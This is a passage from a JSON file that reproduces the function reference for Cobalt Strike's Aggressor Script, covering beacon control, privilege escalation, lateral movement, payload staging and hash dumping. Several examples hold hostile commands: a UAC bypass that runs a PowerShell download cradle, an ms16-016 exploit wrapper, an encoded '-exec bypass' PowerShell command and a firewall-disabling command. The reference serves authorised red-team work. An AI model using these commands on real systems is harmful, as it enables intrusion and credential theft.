        "desc": "(optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map"
      }
    ],
    "returns": "",
    "example": "",
    "notes": "- This function will spawn an x86 process if the Reflective DLL is an x86 DLL. Likewise, if the Reflective DLL is an x64 DLL, this function will spawn an x64 process.\n\n- A well-behaved Reflective DLL follows these rules:\n- Receives a parameter via the reserved DllMain parameter when the DLL_PROCESS_ATTACH reason is specified.\n- Prints messages to STDOUT\n- Calls fflush(stdout) to flush STDOUT\n- Calls ExitProcess(0) when done. This kills the spawned process to host the capability.\n\nExample (ReflectiveDll.c)\n\nThis example is based on Stephen Fewer's Reflective DLL Injection Project:\n\nBOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved ) {\nBOOL bReturnValue = TRUE;\nswitch( dwReason ) {\ncase DLL_QUERY_HMODULE:\nif( lpReserved != NULL )\n*(HMODULE *)lpReserved = hAppInstance;\nbreak;\ncase DLL_PROCESS_ATTACH:\nhAppInstance = hinstDLL;\n\n/* print some output to the operator */\nif (lpReserved != NULL) {\nprintf(\"Hello from test.dll. \nParameter is '%s'\\n\", (char *)lpReserved);\n}\nelse {\nprintf(\"Hello from test.dll. There is no parameter\\n\");\n}\n\n/* flush STDOUT */\nfflush(stdout);\n\n/* we're done, so let's exit */\nExitProcess(0);\nbreak;\ncase DLL_PROCESS_DETACH:\ncase DLL_THREAD_ATTACH:\ncase DLL_THREAD_DETACH:\nbreak;\n}\nreturn bReturnValue;\n}\n\nExample (Aggressor Script)\nalias hello {\nbdllspawn($1, script_resource(\"reflective_dll.dll\"), $2, \n\"test dll\", 5000, false);\n}",
    "signature": "bdllspawn",
    "anchors": [
      "bdllspawn"
    ]
  },
  "bdownload": {
    "description": "Ask a Beacon to download a file",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the file to request"
      }
    ],
    "returns": "",
    "example": "bdownload($1, \"c:\\\\sysprep.inf\");",
    "notes": "",
    "signature": "bdownload",
    "anchors": [
      "bdownload"
    ]
  },
  "bdrives": {
    "description": "Ask Beacon to list the drives on the compromised system",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      }
    ],
    "returns": "",
    "example": "item \"&Drives\" {\nbinput($1, \"drives\");\nbdrives($1);\n}",
    "notes": "",
    "signature": "bdrives",
    "anchors": [
      "bdrives"
    ]
  },
  "beacon_command_describe": {
    "description": "Describe a Beacon command.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the command"
      }
    ],
    "returns": "A string description of the Beacon command.",
    "example": "println(beacon_command_describe(\"ls\"));",
    "notes": "",
    "signature": "beacon_command_describe",
    "anchors": [
      "beacon_command_describe"
    ]
  },
  "beacon_command_detail": {
    "description": "Get the help information for a Beacon command.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the command"
      }
    ],
    "returns": "A string with helpful information about a Beacon command.",
    "example": "println(beacon_command_detail(\"ls\"));",
    "notes": "",
    "signature": "beacon_command_detail",
    "anchors": [
      "beacon_command_detail"
    ]
  },
  "beacon_command_group": {
    "description": "Register a Help Group. A Help Group can assist with organizing the Beacon console's help command output (see Beacon console help help).\n\nGroups will not appear in help until you register commands for the group.\n\nAdded groups will reset when a client disconnects.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the group id (registers commands to the group). Do not include \",\" or \"@\" characters in group ids."
      },
      {
        "param": "$2",
        "desc": "group name"
      },
      {
        "param": "$3",
        "desc": "group description"
      }
    ],
    "returns": "",
    "example": "alis echo {\nblog($1, \"You typed: \" . substr($1, 5));\n}\n\nbeacon_command_group(\n\"my_help_group_id\",\n\"My Help Group Name\",\n\"This is my example help group\");\n\nbeacon_command_register(\n\"echo\",\n\"echo text to beacon log\",\n\"Synopsis: echo [arguments]\\n\\nLog arguments to the Beacon console\",\n\"my_help_group_id\");",
    "notes": "",
    "signature": "beacon_command_group",
    "anchors": [
      "beacon_command_group"
    ]
  },
  "beacon_command_register": {
    "description": "Register help information for a Beacon command.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the command"
      },
      {
        "param": "$2",
        "desc": "the short description of the command"
      },
      {
        "param": "$3",
        "desc": "the long-form help for the command."
      },
      {
        "param": "$4",
        "desc": "(optional) the group id to assign the command. If the group id does not exist, it is ignored."
      }
    ],
    "returns": "",
    "example": "alis echo {\nblog($1, \"You typed: \" . substr($1, 5));\n}\n\nbeacon_command_group(\n\"my_help_group_id\",\n\"My Help Group Name\",\n\"This is my example help group\");\n\nbeacon_command_register(\n\"echo\", \n\"echo text to beacon log\", \n\"Synopsis: echo [arguments]\\n\\nLog arguments to the beacon console\");\n\"my_help_group_id\");\n\nSee Also\n\nUser Defined Tab Completion",
    "notes": "",
    "signature": "beacon_command_register",
    "anchors": [
      "beacon_command_register"
    ]
  },
  "beacon_commands": {
    "description": "Get a list of Beacon commands.",
    "arguments": [],
    "returns": "An array of Beacon commands.",
    "example": "printAll(beacon_commands());",
    "notes": "",
    "signature": "beacon_commands",
    "anchors": [
      "beacon_commands"
    ]
  },
  "beacon_data": {
    "description": "Get metadata for a Beacon session.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon to pull metadata for"
      }
    ],
    "returns": "A dictionary object with metadata about the Beacon session.",
    "example": "println(beacon_data(\"1234\"));",
    "notes": "",
    "signature": "beacon_data",
    "anchors": [
      "beacon_data"
    ]
  },
  "beacon_elevator_describe": {
    "description": "Describe a Beacon command elevator exploit",
    "arguments": [
      {
        "param": "$1",
        "desc": "the exploit"
      }
    ],
    "returns": "A string description of the Beacon command elevator",
    "example": "println(beacon_elevator_describe(\"uac-token-duplication\"));\n\nSee Also\n\n&beacon_elevator_register, &beacon_elevators, &belevate_command",
    "notes": "",
    "signature": "beacon_elevator_describe",
    "anchors": [
      "beacon_elevator_describe"
    ]
  },
  "beacon_elevator_register": {
    "description": "Register a Beacon command elevator with Cobalt Strike. This adds an option to the runasadmin command.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the exploit short name"
      },
      {
        "param": "$2",
        "desc": "a description of the exploit"
      },
      {
        "param": "$3",
        "desc": "the function that implements the exploit ($1 is the Beacon ID, $2 the command and arguments)"
      }
    ],
    "returns": "",
    "example": "# Integrate schtasks.exe (via SilentCleanup) Bypass UAC attack\n# Sourced from Empire: https://github.com/EmpireProject/Empire/tree/master/data/module_source/privesc\nsub schtasks_elevator {\nlocal('$handle $script $oneliner $command');\n\n# acknowledge this command\nbtask($1, \"Tasked Beacon to execute $2 in a high integrity context\", \"T1088\");\n\n# read in the script\n$handle = openf(getFileProper(script_resource(\"modules\"), \"Invoke-EnvBypass.ps1\"));\n$script = readb($handle, -1);\nclosef($handle);\n\n# host the script in Beacon\n$oneliner = beacon_host_script($1, $script);\n\n# base64 encode the command\n$command = transform($2, \"powershell-base64\");\n\n# run the specified command via this exploit.\nbpowerpick!($1, \"Invoke-EnvBypass -Command \\\" $+ $command $+ \\\"\", $oneliner);\n}\n\nbeacon_elevator_register(\"uac-schtasks\", \"Bypass UAC with schtasks.exe (via SilentCleanup)\", &schtasks_elevator);\n\nSee Also\n\n&beacon_elevator_describe, &beacon_elevators, &belevate_command",
    "notes": "",
    "signature": "beacon_elevator_register",
    "anchors": [
      "beacon_elevator_register"
    ]
  },
  "beacon_elevators": {
    "description": "Get a list of command elevator exploits registered with Cobalt Strike.",
    "arguments": [],
    "returns": "An array of Beacon command elevators",
    "example": "printAll(beacon_elevators());\n\nSee also\n\n&beacon_elevator_describe, &beacon_elevator_register, &belevate_command",
    "notes": "",
    "signature": "beacon_elevators",
    "anchors": [
      "beacon_elevators"
    ]
  },
  "beacon_execute_job": {
    "description": "Run a command and report its output to the user.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the Beacon ID"
      },
      {
        "param": "$2",
        "desc": "the command to run (environment variables are resolved)"
      },
      {
        "param": "$3",
        "desc": "the command arguments (environment variables are not resolved)."
      },
      {
        "param": "$4",
        "desc": "flags that change how the job is launched (e.g., 1 = disable WOW64 file system redirection)"
      }
    ],
    "returns": "",
    "example": "alias shell {\nlocal('$args');\n$args = substr($0, 6);\nbtask($1, \"Tasked beacon to run: $args\", \"T1059\");\nbeacon_execute_job($1, \"%COMSPEC%\", \" /C $args\", 0);\n}",
    "notes": "- The string $2 and $3 are combined as-is into a command line. Make sure you begin $3 with a space!\n\n- This is the mechanism Cobalt Strike uses for its shell and powershell commands.",
    "signature": "beacon_execute_job",
    "anchors": [
      "beacon_execute_job"
    ]
  },
  "beacon_execute_postex_job": {
    "description": "Execute a user defined post exploitation task.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the Beacon ID"
      },
      {
        "param": "$2",
        "desc": "the PID to inject the task or $null for using fork&run"
      },
      {
        "param": "$3",
        "desc": "a string containing the postex DLL"
      },
      {
        "param": "$4",
        "desc": "(optional) packed arguments to pass to the postex task"
      },
      {
        "param": "$5",
        "desc": "(optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map"
      },
      {
        "param": "$6",
        "desc": "(optional) the message id type for the postex task. Defaults to CALLBACK_POSTEX_KIT"
      }
    ],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "beacon_execute_postex_job",
    "anchors": [
      "beacon_execute_postex_job"
    ]
  },
  "beacon_exploit_describe": {
    "description": "Describe a Beacon exploit",
    "arguments": [
      {
        "param": "$1",
        "desc": "the exploit"
      }
    ],
    "returns": "A string description of the Beacon exploit",
    "example": "println(beacon_exploit_describe(\"ms14-058\"));\n\nSee Also\n\n&beacon_exploit_register, &beacon_exploits, &belevate",
    "notes": "",
    "signature": "beacon_exploit_describe",
    "anchors": [
      "beacon_exploit_describe"
    ]
  },
  "beacon_exploit_register": {
    "description": "Register a Beacon privilege escalation exploit with Cobalt Strike. This adds an option to the elevate command.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the exploit short name"
      },
      {
        "param": "$2",
        "desc": "a description of the exploit"
      },
      {
        "param": "$3",
        "desc": "the function that implements the exploit ($1 is the Beacon ID, $2 is the listener)"
      }
    ],
    "returns": "",
    "example": "# Integrate windows/local/ms16_016_webdav from Metasploit\n# https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms16_016_webdav.rb\n\nsub ms16_016_exploit {\nlocal('$stager');\n\n# check if we're on an x64 system and error out.\nif (-is64 $1) {\nberror($1, \"ms16-016 exploit is x86 only\");\nreturn;\n}\n\n# acknowledge this command\nbtask($1, \"Task Beacon to run \" . listener_describe($2) . \" via ms16-016\", \"T1068\");\n\n# generate our shellcode\n$stager = payload($2, \"x86\");\n\n# spawn a Beacon post-ex job with the exploit DLL\nbdllspawn!($1, getFileProper(script_resource(\"modules\"), \"cve-2016-0051.x86.dll\"), $stager, \"ms16-016\", 5000);\n\n# link to our payload if it's a TCP or SMB Beacon\nbeacon_link($1, $null, $2);\n}\n\nbeacon_exploit_register(\"ms16-016\", \"mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)\", &ms16_016_exploit);\n\nSee Also\n\n&beacon_exploit_describe, &beacon_exploits, &belevate",
    "notes": "",
    "signature": "beacon_exploit_register",
    "anchors": [
      "beacon_exploit_register"
    ]
  },
  "beacon_exploits": {
    "description": "Get a list of privilege escalation exploits registered with Cobalt Strike.",
    "arguments": [],
    "returns": "An array of Beacon exploits.",
    "example": "printAll(beacon_exploits());\n\nSee also\n\n&beacon_exploit_describe, &beacon_exploit_register, &belevate",
    "notes": "",
    "signature": "beacon_exploits",
    "anchors": [
      "beacon_exploits"
    ]
  },
  "beacon_host_imported_script": {
    "description": "Locally host a previously imported PowerShell script within Beacon and return a short script that will download and invoke this script.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id of the Beacon to host this script with."
      }
    ],
    "returns": "A short PowerShell script to download and evaluate the previously script when run. How this one-liner is used is up to you!",
    "example": "alias powershell {\nlocal('$args $cradle $runme $cmd');\n\n# $0 is the entire command with no parsing.\n$args = substr($0, 11);\n\n# generate the download cradle (if one exists) for an imported PowerShell script\n$cradle = beacon_host_imported_script($1);\n\n# encode our download cradle AND cmdlet+args we want to run\n$runme = base64_encode( str_encode($cradle . $args, \"UTF-16LE\") );\n\n# Build up our entire command line.\n$cmd = \" -nop -exec bypass -EncodedCommand \\\" $+ $runme $+ \\\"\";\n\n# task Beacon to run all of this.\nbtask($1, \"Tasked beacon to run: $args\", \"T1086\");\nbeacon_execute_job($1, \"powershell\", $cmd, 1);\n}",
    "notes": "",
    "signature": "beacon_host_imported_script",
    "anchors": [
      "beacon_host_imported_script"
    ]
  },
  "beacon_host_script": {
    "description": "Locally host a PowerShell script within Beacon and return a short script that will download and invoke this script. This function is a way to run large scripts when there are constraints on the length of your PowerShell one-liner.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id of the Beacon to host this script with."
      },
      {
        "param": "$2",
        "desc": "the script data to host."
      }
    ],
    "returns": "A short PowerShell script to download and evaluate the script when run. How this one-liner is used is up to you!",
    "example": "alias test {\nlocal('$script $hosted');\n$script = \"2 + 2\";\n$hosted = beacon_host_script($1, $script);\n\nbinput($1, \"powerpick $hosted\");\nbpowerpick($1, $hosted);\n}",
    "notes": "",
    "signature": "beacon_host_script",
    "anchors": [
      "beacon_host_script"
    ]
  },
  "beacon_ids": {
    "description": "Get the ID of all Beacons calling back to this Cobalt Strike team server.",
    "arguments": [],
    "returns": "An array of beacon IDs",
    "example": "foreach $bid (beacon_ids()) {\nprintln(\"Bid: $bid\");\n}",
    "notes": "",
    "signature": "beacon_ids",
    "anchors": [
      "beacon_ids"
    ]
  },
  "beacon_info": {
    "description": "Get information from a Beacon session's metadata.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon to pull metadata for"
      },
      {
        "param": "$2",
        "desc": "the key to extract"
      }
    ],
    "returns": "A string with the requested information.",
    "example": "println(\"User is: \" . beacon_info(\"1234\", \"user\"));\nprintln(\"PID is: \" . beacon_info(\"1234\", \"pid\"));",
    "notes": "",
    "signature": "beacon_info",
    "anchors": [
      "beacon_info"
    ]
  },
  "beacon_inline_execute": {
    "description": "Execute a Beacon Object File",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the Beacon"
      },
      {
        "param": "$2",
        "desc": "a string containing the BOF file"
      },
      {
        "param": "$3",
        "desc": "the entry point to call"
      },
      {
        "param": "$4",
        "desc": "packed arguments to pass to the BOF file"
      },
      {
        "param": "$5",
        "desc": "(optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map"
      }
    ],
    "returns": "",
    "example": "",
    "notes": "The Cobalt Strike documentation has a page specific to BOF files. See Beacon Object Files.\n\nExample (hello.c)\n/*\n* Compile with:\n* x86_64-w64-mingw32-gcc -c hello.c -o hello.x64.o\n* i686-w64-mingw32-gcc -c hello.c -o hello.x86.o\n*/\n\n#include \"windows.h\"\n#include \"stdio.h\"\n#include \"tlhelp32.h\"\n#include \"beacon.h\"\n\nvoid demo(char * args, int length) {\ndatap parser;\nchar * str_arg;\nint num_arg;\n\nBeaconDataParse(&parser, args, length);\nstr_arg = BeaconDataExtract(&parser, NULL);\nnum_arg = BeaconDataInt(&parser);\n\nBeaconPrintf(CALLBACK_OUTPUT, \"Message is %s with %d arg\", str_arg, num_arg);\n}\n\nExample (hello.cna)\nalias hello {\nlocal('$barch $handle $data $args');\n\n# figure out the arch of this session\n$barch = barch($1);\n\n# read in the right BOF file\n$handle = openf(script_resource(\"hello. $+ $barch $+ .o\"));\n$data = readb($handle, -1);\nclosef($handle);\n\n# pack our arguments\n$args = bof_pack($1, \"zi\", \"Hello World\", 1234);\n\n# announce what we're doing\nbtask($1, \"Running Hello BOF\");\n\n# execute it.\nbeacon_inline_execute($1, $data, \"demo\", $args);\n}\n\nSee Also\n\n&bof_pack",
    "signature": "beacon_inline_execute",
    "anchors": [
      "beacon_inline_execute"
    ]
  },
  "beacon_job_hide_output": {
    "description": "Hide or show the output of a specific job in Beacon console.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the Beacon id"
      },
      {
        "param": "$2",
        "desc": "the Job id"
      },
      {
        "param": "$3",
        "desc": "1 for hide, 0 for show"
      }
    ],
    "returns": "",
    "example": "beacon_job_hide_output($bid, $jid, 1); # Hide the output\nbeacon_job_hide_output($bid, $jid, 0); # Show the output",
    "notes": "",
    "signature": "beacon_job_hide_output",
    "anchors": [
      "beacon_job_hide_output"
    ]
  },
  "beacon_job_name": {
    "description": "Set the name for a specific job entry.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the Beacon id"
      },
      {
        "param": "$2",
        "desc": "the Job id"
      },
      {
        "param": "$3",
        "desc": "the new job name"
      }
    ],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "beacon_job_name",
    "anchors": [
      "beacon_job_name"
    ]
  },
  "beacon_link": {
    "description": "This function links to an SMB or TCP listener. If the specified listener is not an SMB or TCP listener, this function does nothing.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id of the beacon to link through"
      },
      {
        "param": "$2",
        "desc": "the target host to link to. Use $null for localhost."
      },
      {
        "param": "$3",
        "desc": "the listener to link"
      }
    ],
    "returns": "",
    "example": "# smartlink [target] [listener name]\nalias smartlink {\nbeacon_link($1, $2, $3);\n}",
    "notes": "",
    "signature": "beacon_link",
    "anchors": [
      "beacon_link"
    ]
  },
  "beacon_remote_exec_method_describe": {
    "description": "Describe a Beacon remote execute method",
    "arguments": [
      {
        "param": "$1",
        "desc": "the method"
      }
    ],
    "returns": "A string description of the Beacon remote execute method.",
    "example": "println(beacon_remote_exec_method_describe(\"wmi\"));\n\nSee also\n\n&beacon_remote_exec_method_register, &beacon_remote_exec_methods, &bremote_exec",
    "notes": "",
    "signature": "beacon_remote_exec_method_describe",
    "anchors": [
      "beacon_remote_exec_method_describe"
    ]
  },
  "beacon_remote_exec_method_register": {
    "description": "Register a Beacon remote execute method with Cobalt Strike. This adds an option for use with the remote-exec command.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the method short name"
      },
      {
        "param": "$2",
        "desc": "a description of the method"
      },
      {
        "param": "$3",
        "desc": "the function that implements the exploit ($1 is the Beacon ID, $2 is the target, $3 is the command+args)"
      }
    ],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "beacon_remote_exec_method_register",
    "anchors": [
      "beacon_remote_exec_method_register"
    ]
  },
  "beacon_remote_exec_methods": {
    "description": "Get a list of remote execute methods registered with Cobalt Strike.",
    "arguments": [],
    "returns": "An array of remote exec modules.",
    "example": "printAll(beacon_remote_exec_methods());\n\nSee also\n\n&beacon_remote_exec_method_describe, &beacon_remote_exec_method_register, &bremote_exec",
    "notes": "",
    "signature": "beacon_remote_exec_methods",
    "anchors": [
      "beacon_remote_exec_methods"
    ]
  },
  "beacon_remote_exploit_arch": {
    "description": "Get the arch info for this Beacon lateral movement option.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the exploit"
      }
    ],
    "returns": "x86 or x64",
    "example": "println(beacon_remote_exploit_arch(\"psexec\"));\n\nSee Also\n\n&beacon_remote_exploit_register, &beacon_remote_exploits, &bjump",
    "notes": "",
    "signature": "beacon_remote_exploit_arch",
    "anchors": [
      "beacon_remote_exploit_arch"
    ]
  },
  "beacon_remote_exploit_describe": {
    "description": "Describe a Beacon lateral movement option.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the exploit"
      }
    ],
    "returns": "A string description of the Beacon lateral movement option.",
    "example": "println(beacon_remote_exploit_describe(\"psexec\"));\n\nSee Also\n\n&beacon_remote_exploit_register, &beacon_remote_exploits, &bjump",
    "notes": "",
    "signature": "beacon_remote_exploit_describe",
    "anchors": [
      "beacon_remote_exploit_describe"
    ]
  },
  "beacon_remote_exploit_register": {
    "description": "Register a Beacon lateral movement option with Cobalt Strike. This function extends the jump command.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the exploit short name"
      },
      {
        "param": "$2",
        "desc": "the arch associated with this attack (e.g., x86, x64)"
      },
      {
        "param": "$3",
        "desc": "a description of the exploit"
      },
      {
        "param": "$4",
        "desc": "the function that implements the exploit ($1 is the Beacon ID, $2 is the target, $3 is the listener)"
      }
    ],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "beacon_remote_exploit_register",
    "anchors": [
      "beacon_remote_exploit_register"
    ]
  },
  "beacon_remote_exploits": {
    "description": "Get a list of lateral movement options registered with Cobalt Strike.",
    "arguments": [],
    "returns": "An array of lateral movement option names.",
    "example": "printAll(beacon_remote_exploits());\n\nSee also\n\n&beacon_remote_exploit_describe, &beacon_remote_exploit_register, &bjump",
    "notes": "",
    "signature": "beacon_remote_exploits",
    "anchors": [
      "beacon_remote_exploits"
    ]
  },
  "beacon_remove": {
    "description": "Remove a Beacon from the display.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon to remove"
      }
    ],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "beacon_remove",
    "anchors": [
      "beacon_remove"
    ]
  },
  "beacon_stage_pipe": {
    "description": "This function handles the staging process for a bind pipe stager. This is an optional stager for lateral movement. You can stage any x86 payload/listener through this stager. Use &stager_bind_pipe to generate this stager.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id of the beacon to stage through"
      },
      {
        "param": "$2",
        "desc": "the target host"
      },
      {
        "param": "$3",
        "desc": "the listener name"
      },
      {
        "param": "$4",
        "desc": "the architecture of the payload to stage. x86 is the only option right now."
      }
    ],
    "returns": "",
    "example": "# step 1. generate our stager\n$stager = stager_bind_pipe(\"my-listener\");\n\n# step 2. do something to run our stager\n\n# step 3. stage a payload via this stager\nbeacon_stage_pipe($bid, $target, \"my-listener\", \"x86\");\n\n# step 4. assume control of the payload (if needed)\nbeacon_link($bid, $target, \"my-listener\");",
    "notes": "",
    "signature": "beacon_stage_pipe",
    "anchors": [
      "beacon_stage_pipe"
    ]
  },
  "beacon_stage_tcp": {
    "description": "This function handles the staging process for a bind TCP stager. This is the preferred stager for localhost-only staging. You can stage any payload/listener through this stager. Use &stager_bind_tcp to generate this stager.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id of the beacon to stage through"
      },
      {
        "param": "$2",
        "desc": "reserved; use $null for now."
      },
      {
        "param": "$3",
        "desc": "the port to stage to"
      },
      {
        "param": "$4",
        "desc": "the listener name"
      },
      {
        "param": "$5",
        "desc": "the architecture of the payload to stage (x86, x64)"
      }
    ],
    "returns": "",
    "example": "# step 1. generate our stager\n$stager = stager_bind_tcp(\"my-listener\", \"x86\", 1234);\n\n# step 2. do something to run our stager\n\n# step 3. stage a payload via this stager\nbeacon_stage_tcp($bid, $target, 1234, \"my-listener\", \"x86\");\n\n# step 4. assume control of the payload (if needed)\nbeacon_link($bid, $target, \"my-listener\");",
    "notes": "",
    "signature": "beacon_stage_tcp",
    "anchors": [
      "beacon_stage_tcp"
    ]
  },
  "beacons": {
    "description": "Get information about all Beacons calling back to this Cobalt Strike team server.",
    "arguments": [],
    "returns": "An array of dictionary objects with information about each beacon.",
    "example": "foreach $beacon (beacons()) {\nprintln(\"Bid: \" . $beacon['id'] . \" is \" . $beacon['name']);\n}",
    "notes": "",
    "signature": "beacons",
    "anchors": [
      "beacons"
    ]
  },
  "belevate": {
    "description": "Ask Beacon to spawn an elevated session with a registered technique.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the exploit to fire"
      },
      {
        "param": "$3",
        "desc": "the listener to target."
      }
    ],
    "returns": "",
    "example": "item \"&Elevate 31337\" {\nopenPayloadHelper(lambda({\nbinput($bids, \"elevate ms14-058 $1\");\nbelevate($bids, \"ms14-058\", $1);\n}, $bids => $1));\n}\n\nSee also\n\n&beacon_exploit_describe, &beacon_exploit_register, &beacon_exploits",
    "notes": "",
    "signature": "belevate",
    "anchors": [
      "belevate"
    ]
  },
  "belevate_command": {
    "description": "Ask Beacon to run a command in a high-integrity context",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the module/command elevator to use"
      },
      {
        "param": "$3",
        "desc": "the command and its arguments."
      }
    ],
    "returns": "",
    "example": "# disable the firewall\nalias shieldsdn {\nbelevate_command($1, \"uac-token-duplication\", \"cmd.exe /C netsh advfirewall set allprofiles state off\");\n}\n\nSee also\n\n&beacon_elevator_describe, &beacon_elevator_register, &beacon_elevators",
    "notes": "",
    "signature": "belevate_command",
    "anchors": [
      "belevate_command"
    ]
  },
  "berror": {
    "description": "Publish an error message to the Beacon transcript",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon to post to"
      },
      {
        "param": "$2",
        "desc": "the text to post"
      }
    ],
    "returns": "",
    "example": "alias donotrun {\nberror($1, \"You should never run this command!\");\n}",
    "notes": "",
    "signature": "berror",
    "anchors": [
      "berror"
    ]
  },
  "bexecute": {
    "description": "Ask Beacon to execute a command [without a shell]. This provides no output to the user.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the command and arguments to run"
      }
    ],
    "returns": "",
    "example": "bexecute($1, \"notepad.exe\");",
    "notes": "",
    "signature": "bexecute",
    "anchors": [
      "bexecute"
    ]
  },
  "bexecute_assembly": {
    "description": "Spawns a local .NET executable assembly as a Beacon post-exploitation job.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the local path to the .NET executable assembly"
      },
      {
        "param": "$3",
        "desc": "parameters to pass to the assembly"
      },
      {
        "param": "$4",
        "desc": "(optional) the \"PATCHES:\" argument can modify functions in memory for the process. Up to 4 \"patch-rule\" rules can be specified (space delimited)."
      },
      {
        "param": "$5",
        "desc": "(optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map"
      }
    ],
    "returns": "",
    "example": "alias myutil {\nbexecute_assembly($1, script_resource(\"myutil.exe\"), \"arg1 arg2 \\\"arg 3\\\"\");\n}",
    "notes": "- This command accepts a valid .NET executable and calls its entry point. \n\n- This post-exploitation job inherits Beacon's thread token.\n\n- Compile your custom .NET programs with a .NET 3.5 compiler for compatibility with systems that don't have .NET 4.0 and later.",
    "signature": "bexecute_assembly",
    "anchors": [
      "bexecute_assembly"
    ]
  },
  "bexit": {
    "description": "Ask a Beacon to exit.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      }
    ],
    "returns": "",
    "example": "item \"&Die\" {\nbinput($1, \"exit\");\nbexit($1);\n}",
    "notes": "",
    "signature": "bexit",
    "anchors": [
      "bexit"
    ]
  },
  "bgetprivs": {
    "description": "Attempts to enable the specified privilege in your Beacon session.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "a comma-separated list of privileges to enable. See:"
      }
    ],
    "returns": "",
    "example": "alias debug {\nbgetprivs($1, \"SeDebugPriv\");\n}",
    "notes": "",
    "signature": "bgetprivs",
    "anchors": [
      "bgetprivs"
    ]
  },
  "bgetsystem": {
    "description": "Ask Beacon to attempt to get the SYSTEM token.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      }
    ],
    "returns": "",
    "example": "item \"Get &SYSTEM\" {\nbinput($1, \"getsystem\");\nbgetsystem($1);\n}",
    "notes": "",
    "signature": "bgetsystem",
    "anchors": [
      "bgetsystem"
    ]
  },
  "bgetuid": {
    "description": "Ask Beacon to print the User ID of the current token",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      }
    ],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "bgetuid",
    "anchors": [
      "bgetuid"
    ]
  },
  "bhashdump": {
    "description": "Ask Beacon to dump local account password hashes. If injecting into a pid that process requires administrator privileges.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the PID to inject the hashdump dll into or $null."
      },
      {
        "param": "$3",
        "desc": "(optional) the architecture of the target PID (x86|x64) or $null."
      },
      {
        "param": "$4",
        "desc": "(optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map."
      }
    ],
    "returns": "",
    "example": "Spawn a temporary process\nitem \"Dump &Hashes\" {\nbinput($1, \"hashdump\");\nbhashdump($1);\n}\n\nInject into the specified process)\nbhashdump($1, 1234, \"x64\");",
    "notes": "",
    "signature": "bhashdump",
    "anchors": [
      "bhashdump"
    ]
  },
  "bind": {
    "description": "Bind a keyboard shortcut to an Aggressor Script function. This is an alternate to the bind keyword.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the keyboard shortcut"
      },
      {
        "param": "$2",
        "desc": "a callback function. Called when the event happens."
      }
    ],
    "returns": "",
    "example": "# bind Ctrl+Left and Ctrl+Right to cycle through previous and next tab.\n\nbind(\"Ctrl+Left\", {\npreviousTab();\n});\n\nbind(\"Ctrl+Right\", {\nnextTab();\n});\n\nSee also\n\n&unbind",
    "notes": "",
    "signature": "bind",
    "anchors": [
      "bind"
    ]
  },
  "binfo": {
    "description": "Get information from a Beacon session's metadata.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon to pull metadata for"
      },
      {
        "param": "$2",
        "desc": "the key to extract"
      }
    ],
    "returns": "A string with the requested information.",
    "example": "println(\"User is: \" . binfo(\"1234\", \"user\"));\nprintln(\"PID is: \" . binfo(\"1234\", \"pid\"));",
    "notes": "",
    "signature": "binfo",
    "anchors": [
      "binfo"
    ]
  },
  "binject": {
    "description": "Ask Beacon to inject a session into a specific process.",
